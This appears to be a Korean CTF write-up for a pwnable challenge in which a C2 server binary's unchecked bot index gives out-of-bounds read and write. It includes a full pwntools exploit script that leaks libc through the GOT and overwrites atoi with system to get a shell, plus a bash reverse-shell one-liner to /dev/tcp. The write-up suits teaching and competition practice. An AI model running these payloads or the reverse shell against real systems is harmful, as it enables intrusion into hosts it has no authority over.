+++
title = "WhiteHat Contest 2025 Quals - Search And Attack"
date = "2025-11-17"
description = "WhiteHat Contest 2025 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "pwninit", "improper check", "out of bound", "got overwrite", "reverse shell"]
+++

## 0x00. Introduction
``` bash
➜  tree .
.
├── 8f7c31c3010792cd92b452ac7223128f64189e61ee52fedc107c87a3408a66e9
└── cnc
    ├── 39fda5175d9a8746dea0cfbf05389ac2cfb85e531dbbe9e9aa517dfe9b7e6de2
    ├── 39fda5175d9a8746dea0cfbf05389ac2cfb85e531dbbe9e9aa517dfe9b7e6de2.c
    └── libc.so.6
```

실행 파일은 서버와 악성코드(아마도), 소스코드와 라이브러리 파일이 제공된다.
처음에 악성코드로 추정되는 `8f7c` 파일을 분석해야 하나 싶었는데, 결국에는 문제와 전혀 관련이 없었다.

``` bash
[*] '/home/user/cnc/39fda5175d9a8746dea0cfbf05389ac2cfb85e531dbbe9e9aa517dfe9b7e6de2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

C2 서버 파일인 `39fd`에 적용된 보호기법은 위와 같다.

### Environment
오랜만에 docker 환경이 아닌 라이브러리 파일이 주어져 `LD_PRELOAD`를 하려고 했는데, 링킹이 잘 안됐다.

결국 [pwninit](https://github.com/io12/pwninit)이라는 툴을 찾아 해결했다.
라이브러리 파일을 로드할 수 있는 로더를 찾아 다운받을 뿐만 아니라 바이너리를 패치해서 주어진 라이브러리를 로드하게 변경해준다.
굉장히 간단한데 강력한 도구인 것 같다.

### Concept
``` bash
➜  ./39fda5175d9a8746dea0cfbf05389ac2cfb85e531dbbe9e9aa517dfe9b7e6de2
[*] Starting server on port 8080...
[*] Server listening on port 8080
```

C2 서버 파일을 실행하면 위와 같이 8080 포트를 열고 대기한다.
이후 C2 프로토콜에 맞는 요청이 왔을 때 그에 해당하는 로직을 수행한다.


## 0x01. Vulnerability
코드가 약 500줄정도 되는데 하나의 취약점으로 exploit에 성공해서 다른 취약점이 있을 수도 있다.

``` c
void update_bot(int bot_id, const char* data, size_t data_size) {
    pthread_mutex_lock(&bots_mutex);
    
    int index = bot_id;
    int field_count = 0;
    ...
    while (*ptr && field_count < 8) {
        if (*ptr == '|') {
            *ptr = '\0';
            fields[field_count++] = start;
            start = ptr + 1;
        }
        ptr++;
    }
    if (field_count < 8) {
        fields[field_count++] = start;
    }
    
    if (field_count > 0 && strlen(fields[0]) > 0) 
        memcpy(bots[index].hostname, fields[0], MAX_BUFFER_LEN - 1);
    
    if (field_count > 1 && strlen(fields[1]) > 0) 
        memcpy(bots[index].username, fields[1], MAX_BUFFER_LEN - 1);
    ...
    printf("[*] Bot updated: ID=%d\n", bot_id);
    
    pthread_mutex_unlock(&bots_mutex);
}

void detail_bot(int bot_id, int client_socket) {
    pthread_mutex_lock(&bots_mutex);
    
    char response[BUFFER_SIZE * 4] = {0};
    
    int index = bot_id;
    snprintf(response, sizeof(response), 
            "BOT_DETAIL|%d|%.255s|%.255s|%.15s|%.15s|%.255s|%.255s|%.63s|%.63s|%ld\n",
            bots[index].id,
            bots[index].hostname,
            bots[index].username,
            bots[index].public_ip,
            bots[index].private_ip,
            bots[index].os_info,
            bots[index].cpu_info,
            bots[index].ram_info,
            bots[index].disk_info,
            bots[index].last_seen);

    send(client_socket, response, strlen(response), 0);
    
    pthread_mutex_unlock(&bots_mutex);
}
```

`update_bot`과 `detail_bot`에서 `index`에 대한 검증을 하지 않기 때문에 각각 OOB write, OOB read 취약점이 발생한다.


## 0x02. Exploit
### OOB Read
최대 `bots`의 개수인 `MAX_BOTS`가 1000이나 되기 때문에 `bots`의 뒤 영역보다는 앞 영역에 관심이 갔다.

우선 OOB read를 활용하기 위해 다음과 같이 payload를 작성했다.

``` python
    s.sendline(b"DETAIL|-1")
    r = s.recv().split(b"|")[1:]
    for o, f in zip(order, r):
        print(f"{o} : {f}, len {len(f)}")
```

이 때 출력되는 내용은 다음과 같다.

``` bash
id : b'0', len 1
hostname : b'', len 0
username : b'', len 0
public_ip : b'XXXXXXXXXXXXXXX', len 15
private_ip : b'XXXXXXXXXXXXXXX', len 15
os_info : b'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', len 255
cpu_info : b'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX', len 32
ram_info : b'\xa0\x95\xd3\xf7\xff\x7f', len 6
disk_info : b'P\xec\xd0\xf7\xff\x7f', len 6
last_seen : b'0\n', len 2
```

`ram_info`와 `disk_info`를 보면 libc 주소가 얻어진다.
`bots` 위 영역에 해당하는 메모리를 출력해보면 다음과 같다.

``` bash
gef➤  x/46gx 0x0000000000406000
0x406000 <free@got.plt>:        0x00007ffff7cadd30      0x00007ffff7d2bbe0
0x406010 <puts@got.plt>:        0x0000000000401050      0x00007ffff7d2c180
0x406020 <inet_ntoa@got.plt>:   0x00007ffff7d3c400      0x00007ffff7d2ba30
0x406030 <strlen@got.plt>:      0x00007ffff7d8b780      0x00000000004010a0
0x406040 <htons@got.plt>:       0x00007ffff7d395a0      0x00007ffff7d2bec0
0x406050 <printf@got.plt>:      0x00007ffff7c60100      0x00007ffff7c66370
0x406060 <memset@got.plt>:      0x00007ffff7d89440      0x0000000000401100
0x406070 <strcmp@got.plt>:      0x00007ffff7d8afd0      0x00007ffff7c451a0
0x406080 <memcpy@got.plt>:      0x00007ffff7d88a40      0x00007ffff7fc3a40
0x406090 <select@got.plt>:      0x00007ffff7d26bc0      0x00007ffff7ca1a70
0x4060a0 <malloc@got.plt>:      0x00007ffff7cad650      0x00007ffff7c9dc70
0x4060b0 <listen@got.plt>:      0x00007ffff7d2bb50      0x00007ffff7d395a0
0x4060c0 <bind@got.plt>:        0x00007ffff7d2b960      0x00007ffff7c9cbc0
0x4060d0 <perror@got.plt>:      0x00007ffff7c28a93      0x00007ffff7cb5c00
0x4060e0 <accept@got.plt>:      0x00007ffff7d2b820      0x00007ffff7c58750
0x4060f0 <strcat@got.plt>:      0x007ffff7d0ec507c      0x00007ffff7d0ec50
0x406100 <pthread_mutex_lock@got.plt>:  0x00007ffff7c9fff0      0x00007ffff7d2c310
0x406110:       0x0000000000000000      0x0000000000000000
0x406120 <server_running>:      0x0000000000000001      0x0000000000000000
0x406130:       0x0000000000000000      0x00000000691bb9f6
0x406140 <completed.0>: 0x0000000000000000      0x0000000000000000
0x406150:       0x0000000000000000      0x0000000000000000
0x406160 <bots>:        0x0000000000000000      0x0000000000000000
```

이렇게 GOT 영역을 통해 libc 주소가 출력된다.
출력된 주소는 `ntohs`와 `sleep`의 libc 주소이다.

### OOB Write
따라서 `update_bot`을 이용해 GOT overwrite 시나리오를 생각했는데, 그 과정에서 두 가지 실수가 있었다.

1. GOT보다 위 영역에는 `r` 권한만 있기 때문에 `hostname`, `username` 등을 쓰는 과정에서 Segmentation Fault가 발생함
2. `ntohs`와 `sleep`의 GOT를 overwrite하려고 함

이 실수들은 코드를 잘 보면 하지 않았을 것이라서 피드백 차원으로 기록한다.

``` c
if (field_count > 6 && strlen(fields[6]) > 0) 
    memcpy(bots[bot_index].ram_info, fields[6], MAX_IO_INFO_BUFFER_LEN - 1);
```

1. `strlen(field[i]) > 0`일 때만 `memcpy`를 하기 때문에 `field[i]`를 비워두면 `hostname`, `username`을 쓰는 과정을 스킵할 수 있음
2. `memcpy`로 메모리를 통째로 복사하기 때문에 굳이 `ntohs`나 `sleep`이 아닌 뒤에 있는 다른 함수의 GOT를 overwrite해도 됨

아무튼 OOB write를 이용해 GOT overwrite를 하기 위해 `ntohs` 이후의 GOT들을 출력해보았다.

``` bash
0x4060b8 <ntohs@got.plt>:       0x00007ffff7d395a0
0x4060c0 <bind@got.plt>:        0x00007ffff7d2b960
0x4060c8 <pthread_create@got.plt>:      0x00007ffff7c9cbc0
0x4060d0 <perror@got.plt>:      0x00007ffff7c28a93
0x4060d8 <strtok@got.plt>:      0x00007ffff7cb5c00
0x4060e0 <accept@got.plt>:      0x00007ffff7d2b820
0x4060e8 <atoi@got.plt>:        0x00007ffff7c58750
0x4060f0 <strcat@got.plt>:      0x007ffff7d0ec507c
0x4060f8 <sleep@got.plt>:       0x00007ffff7d0ec50
0x406100 <pthread_mutex_lock@got.plt>:  0x00007ffff7c9fff0
0x406108 <socket@got.plt>:      0x00007ffff7d2c310
0x406110:       0x0000000000000000
0x406118:       0x0000000000000000
0x406120 <server_running>:      0x0000000000000001
```

위 함수들 중 인자에 입력을 넣기 좋은 함수를 찾아보았는데, `atoi`가 좋아보였다.

``` c
void* handle_client(void* arg) {
    ...
    else if (strcmp(cmd, CMD_DELETE) == 0) {
        char *bot_id_str = strtok(NULL, "|");
        if (bot_id_str) {
            int bot_id = atoi(bot_id_str);
            delete_bot(bot_id);
            char response[] = "DELETED|OK\n";
            send(client_socket, response, strlen(response), 0);
        }
    }
    ...
}
```

서버에 전달되는 `DELETE|` 이후에 있는 문자열이 그대로 `bot_id_str`에 들어가기 때문에 `atoi`의 GOT를 `system`의 주소로 바꿨을 경우 인자를 전달해주기 매우 편리하다.
이 때 다른 함수들의 GOT를 건들이면 에러가 날 확률이 높기 때문에 기존 값들을 유지해줘야 한다.

따라서 다음과 같이 payload를 작성했다.

``` python
    payload = b"UPDATE|-1|"
    payload += b"|" * 6
    payload += p64(libc_base + lib.symbols['ntohs'])
    payload += p64(libc_base + lib.symbols['bind'])
    payload += p64(libc_base + lib.symbols['pthread_create'])
    payload += p64(libc_base + lib.symbols['perror'])
    payload += p64(libc_base + lib.symbols['strtok'])
    payload += p64(libc_base + lib.symbols['accept'])
    payload += p64(libc_base + lib.symbols['system'])       # atoi
    payload += b"|"
    payload += p64(sleep_addr)
    s.sendline(payload)

    print(s.recv())

    payload = b"DELETE|"
    payload += b"/bin/sh"
    s.sendline(payload)

    print(p.recv())
```

여기에서는 `system`의 인자로 `/bin/sh`를 전달해도 충분했는데, 환경에 따라서는 다음과 같은 인자가 필요할 수도 있다.

- `bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'`


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "39fda5175d9a8746dea0cfbf05389ac2cfb85e531dbbe9e9aa517dfe9b7e6de2_patched"
LIBRARY = "libc.so.6"
CONTAINER = ""
code_base = 0x555555554000
bp = {
    'main' : code_base + 0x16ae,
}
gs = f'''
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main(server, port, debug):
    if(port):
        s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        p = process(BINARY)
        if debug:
            gdb.attach(p, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)
    order = ["id", "hostname", "username", "public_ip", "private_ip", "os_info", "cpu_info", "ram_info", "disk_info", "last_seen"]

    print(p.recvuntil(b"8080\n"))

    s = remote("127.0.0.1", 8080)

    s.sendline(b"DETAIL|-1")
    r = s.recv().split(b"|")[1:]
    for o, f in zip(order, r):
        print(f"{o} : {f}, len {len(f)}")
    ntohs_addr = u64(r[-3] + b"\x00\x00")
    sleep_addr = u64(r[-2] + b"\x00\x00")
    libc_base = sleep_addr - lib.symbols['sleep']

    log.info(f"ntohs_addr : {hex(ntohs_addr)}")
    log.info(f"sleep_addr : {hex(sleep_addr)}")
    log.info(f"libc_base  : {hex(libc_base)}")

    payload = b"UPDATE|-1|"
    payload += b"|" * 6
    payload += p64(libc_base + lib.symbols['ntohs'])
    payload += p64(libc_base + lib.symbols['bind'])
    payload += p64(libc_base + lib.symbols['pthread_create'])
    payload += p64(libc_base + lib.symbols['perror'])
    payload += p64(libc_base + lib.symbols['strtok'])
    payload += p64(libc_base + lib.symbols['accept'])
    payload += p64(libc_base + lib.symbols['system'])       # atoi
    payload += b"|"
    payload += p64(sleep_addr)
    s.sendline(payload)

    print(s.recv())

    payload = b"DELETE|"
    payload += b"/bin/sh"
    s.sendline(payload)

    print(p.recv())

    p.interactive()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```